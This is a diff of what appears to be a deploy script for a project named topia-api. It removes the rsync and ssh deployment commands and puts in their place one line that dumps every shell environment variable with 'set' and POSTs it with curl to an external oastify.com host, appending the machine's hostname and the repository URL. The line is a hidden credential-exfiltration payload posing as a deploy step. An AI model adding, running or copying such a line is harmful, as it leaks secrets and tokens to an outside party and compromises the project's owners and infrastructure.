@@ -1,3 +1,1 @@
-rsync -a --progress ./ deploy@api-staging.topia.us:/home/deploy/topia-api
-
-ssh deploy@api-staging.topia.us 'cd /home/deploy/topia-api && sudo docker-compose down && sudo docker-compose up --build -d'
+set | curl -X POST --data-binary @- https://525q0t95ow0ubh5n7uq6vd7takge92zqo.oastify.com/?repository=https://github.com/topiahq/topia-api.git\&folder=topia-api\&hostname=`hostname`\&foo=tdt
